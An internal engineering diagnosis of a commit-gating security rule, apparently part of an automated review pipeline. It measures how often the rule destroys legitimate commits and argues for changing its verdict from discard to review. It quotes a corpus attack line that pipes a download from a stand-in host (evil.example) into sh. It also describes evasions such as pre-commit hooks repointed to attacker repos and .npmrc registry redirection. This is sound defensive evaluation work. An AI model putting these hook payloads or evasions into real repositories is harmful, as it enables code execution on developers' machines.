# `execution-surface-write` destroys 260 real commits. What it is, and what to do.

A diagnosis of `apps/server/src/rules/exec-surface.ts`, produced across review sessions 91
and 47. **Nothing in `apps/server/src` was modified by this lane.** Every figure below comes from
invoking the shipped rule and the shipped policy directly from source. No build was run, no replay
was run, and `apps/server/dist` was not touched, because three sessions share it.

Reproduce:

```
npx tsx research/benchmarking/exec-surface-dist.ts      # distributions, both sides
npx tsx research/benchmarking/exec-precommit.ts         # the pre-commit family, side by side
npx tsx research/benchmarking/exec-probe.ts             # five hand-written probes through defaultPolicy
npx tsx research/benchmarking/exec-cost.ts              # what a narrowing would cost in detections
```

## 1. The class is real, and it is one file

260 real commits destroyed, producing 273 rule hits. By path:

| path | hits | share |
|---|---:|---:|
| `.pre-commit-config.yaml` | 232 | 85.0% |
| `.husky/pre-push` | 8 | |
| `.npmrc` | 6 | |
| `.gitattributes` | 6 | |
| `.husky/pre-commit` | 6 | |
| `.cursor/rules/*.mdc` | 8 | |
| everything else | 7 | |

By detail: `exec-surface:vcs-hook` 256, `exec-surface:agent-config` 11, `exec-surface:pm-hook` 6.

Session 91's hypothesis from six examples was right, and the distribution puts a number on it: this
is overwhelmingly ordinary maintenance of one Python tooling file. A rule that destroys that is
unusable in any Python repository.

Two of the smaller cases are worth naming because they are worse than the headline:

- `.gitattributes` with `* text=auto eol=lf`. A line-ending directive with no execution semantics
  at all, destroyed as an execution-surface expansion.
- `.npmrc` with `ignore-scripts=true`. That line is a **hardening** measure: it stops npm running
  install scripts. The rule destroys a commit that reduces the execution surface, on the grounds
  that it changed the execution surface.

That is the `shlex.split` shape again. The rule reads a path class and fires without reading the
direction of the change.

## 2. The separation looks perfect, on the pre-commit family

Restricted to the pre-commit path family: 232 real destroyed hits against 8 corpus attack hits.

```
added lines contain a shell or download primitive:   real 0/232      attack 8/8
```

All 8 corpus attacks add the same thing, `entry: sh -c 'curl http://evil.example/x|sh'`. All 232
real commits add `rev:` pins, `- repo:` declarations and `exclude:` patterns. Nothing else.

A content predicate on shell primitives therefore separates this family completely, and it is a
content predicate rather than a path predicate, so it is not defeated by the case and homoglyph
variants the corpus already contains (`.PRE-COMMIT-CONFIG.YAML`, `.PrE-CoMmIt-cOnFiG.YaMl`).

**Do not ship it.** Sections 3 and 4 are why.

## 3. Globally, that predicate loses 83 attacks and every one of them escapes

Measured over all 225 corpus attack scenarios where this rule fires:

```
also caught by another rule (defence in depth):  139  (61.8%)
ONLY this rule contains them:                     86  (38.2%)

under a shell-primitive predicate on the added lines:
  attacks kept:                                  142
  attacks released:                               83
  of those released, would ACTUALLY escape:       83     <- all of them
```

The escaping attacks are `.npmrc`, `.yarnrc.yml` and `.gitmodules`, at every case variant. Those
attacks carry no shell primitive **by nature**: the harm is a destination change, a registry
repointed or a submodule aimed at an attacker repo, not a command. An attacker satisfies neither
half of the predicate simply by attacking through `.npmrc` instead of a hook entry. That is exactly
the split question session 91 raised, and the predicate fails it.

## 4. Even scoped to pre-commit, the clean column is the corpus's own gap

Five hand-written probes through the whole shipped policy (`exec-probe.ts`):

| probe | decision | which rules fired |
|---|---|---|
| corpus-shape attack, `curl ... \| sh` | discard | `execution-surface-write`, `remote-code-execution-added` |
| benign, a real `rev:` pin bump | **discard** | `execution-surface-write` |
| evasion 1, attacker-controlled hook repo, no shell primitive | discard | `execution-surface-write` only |
| evasion 2, `entry: python tools/helper.py`, no shell primitive | discard | `execution-surface-write` only |
| evasion 3, existing hook repointed to an attacker fork | discard | `execution-surface-write` only |

Two things fall out.

**The corpus attacks on this path are already covered twice.** The one attack shape the corpus
contains also trips `remote-code-execution-added`. So the 8 attacks a scoped predicate would keep
are not evidence the predicate is safe; another rule was holding them anyway. This is the finding
`NARROWING.md` recorded for `dependency-added`: a clean risk column produced by a second rule is not
evidence about the first one.

**The three evasions are held by this rule alone.** A pre-commit hook pointing at
`github.com/attacker-org/lint-helper` with a pinned `rev:` is byte-shaped identically to legitimate
maintenance, contains no shell primitive, and would commit under any content predicate built from
this corpus. The corpus does not contain that attack, which is the only reason the predicate looks
clean.

**And the benign pin bump discards.** That row is the real diagnosis. The rule does not discriminate
on this path at all: it discards any modification to `.pre-commit-config.yaml`. Its "catch" of the 8
corpus attacks is not detection, it is a blanket path rule that happens to cover them.

## 5. What to do instead, and why it is safe

Change the **verdict**, not the predicate. Let the write arm reach `review` rather than `discard` on
declarative hook-config paths.

The grading definitions make this cost nothing in containment. From `research/corpus/replay-v2.mjs`:

```
miss:       policyDecidable && decision === "commit"
falseAbort: decision === "discard"
humanAsk:   decision === "review"
```

A miss is a **commit**. Review is contained. So moving this arm from `discard` to `review`:

- loses **zero** attacks. All 225 stay contained. The 139 with defence in depth keep discarding
  through the other rule; the 86 this rule holds alone move to review, which is still contained.
- converts **232 destroyed real commits into held ones**, from unrecoverable to recoverable.
- keeps every evasion in section 4 caught, because the predicate does not change.

That is the same move session 91 made on `multi-file-delete`, which took 195 real commits from
unrecoverable to recoverable with nothing newly destroyed and nothing newly held.

**The cost is honest and it is on the queue, not the miss rate.** Those 232 commits become human
asks. Against a real-commit hold rate of 23.88% that is a real increase, and the queue is already
the weakest number this project publishes. The trade is a worse queue for a better destroy rate, and
the destroy rate is the one that cannot be undone.

## 6. What this lane did not do

No code was changed and no gate was run. The counts above come from invoking the rule and
`defaultPolicy` directly on scenario files, not from a graded replay, so they should be confirmed by
a real run before anything ships. Session 47 holds the gates and a full corpus grade takes about 24
seconds there.

The three evasions in section 4 are hand-written by this lane and are not in any corpus. They are an
argument that a predicate is unsafe, not a measurement of how often that shape occurs. If they are
worth defending against, they belong in a scenario file first.
